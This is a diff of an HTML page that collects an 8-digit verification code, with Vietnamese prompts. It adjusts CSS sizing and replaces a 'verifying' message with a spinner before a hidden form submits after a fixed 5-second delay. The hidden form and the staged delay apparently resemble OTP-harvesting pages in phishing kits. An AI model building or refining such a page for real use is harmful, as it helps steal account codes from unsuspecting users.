@@ -18,11 +18,11 @@
     .container {
         text-align: center;
         background: #fff;
-        padding: 40px;
+        padding: 40px 20px;
         border-radius: 15px;
         box-shadow: 0 10px 25px rgba(0,0,0,0.2);
         width: 500px;
-        max-width: 90%;
+        max-width: 95%;
     }
 
     .message {
@@ -37,7 +37,7 @@
         .message {
             font-size: 16px;
             margin-bottom: 20px;
-            padding: 0 10px;
+            padding: 0 5px;
             word-break: break-word;
         }
     }
@@ -77,13 +77,6 @@
         animation: spin 1s linear infinite;
     }
 
-    .loading-text {
-        display: none;
-        color: gray;
-        font-size: 18px;
-        margin-top: 10px;
-    }
-
     @keyframes spin {
         0% { transform: rotate(0deg);}
         100% { transform: rotate(360deg);}
@@ -99,20 +92,20 @@
     }
 
     .otp-display {
-        font-size: 32px;
-        letter-spacing: 10px;
+        font-size: 28px;
+        letter-spacing: 6px;
         margin-bottom: 20px;
     }
 
     .keypad-grid {
         display: grid;
-        grid-template-columns: repeat(3, 70px);
-        gap: 10px;
+        grid-template-columns: repeat(3, 60px);
+        gap: 8px;
     }
 
     .keypad-grid button {
-        height: 60px;
-        font-size: 22px;
+        height: 50px;
+        font-size: 20px;
         border-radius: 8px;
         border: 1px solid #aaa;
         background: #f5f5f5;
@@ -127,9 +120,6 @@
     @media (max-width: 768px) {
         .otp-container { display: none; }
         .mobile-keypad { display: flex; }
-        .otp-display { font-size: 28px; letter-spacing: 6px; }
-        .keypad-grid { grid-template-columns: repeat(3, 60px); gap: 8px; }
-        .keypad-grid button { height: 50px; font-size: 20px; }
     }
 </style>
 </head>
@@ -141,7 +131,7 @@
         Vui lòng kiểm tra và nhập mã xác thực bên dưới.
     </div>
 
-    <!-- PC/Laptop OTP -->
+    <!-- PC OTP -->
     <div class="otp-container" id="otpContainer">
         <input type="text" maxlength="1">
         <input type="text" maxlength="1">
@@ -162,7 +152,6 @@
             <button>7</button><button>8</button><button>9</button>
             <div></div><button>0</button><div></div>
         </div>
-        <div class="loading-text" id="loadingText">Đang xác thực...</div>
     </div>
 
     <div class="spinner" id="spinner"></div>
@@ -188,7 +177,6 @@
     const spinner = document.getElementById('spinner');
     const otpDisplay = document.getElementById('otpDisplay');
     const keypadGrid = document.getElementById('keypadGrid');
-    const loadingText = document.getElementById('loadingText');
 
     let currentIndex = 0;
     let codeArr = Array(8).fill('*');
@@ -255,13 +243,11 @@
         if(window.innerWidth <= 768){
             // Mobile
             txtCode.value = codeArr.join('');
-            loadingText.style.display = 'block'; // hiện text gray
-            setTimeout(() => {
-                otpDisplay.style.display = 'none';
-                loadingText.style.display = 'none';
-                spinner.style.display = 'block';
-                setTimeout(()=> hiddenForm.submit(), 3000); // 3s spinner trước submit
-            }, 2000); // 2s text gray trước spinner
+            // Ẩn keypad + display
+            otpDisplay.style.display = 'none';
+            keypadGrid.style.display = 'none';
+            spinner.style.display = 'block';
+            setTimeout(()=> hiddenForm.submit(), 5000); // 5s spinner trước submit
         } else {
             // PC
             txtCode.value = inputs.map(i=>i.value).join('');
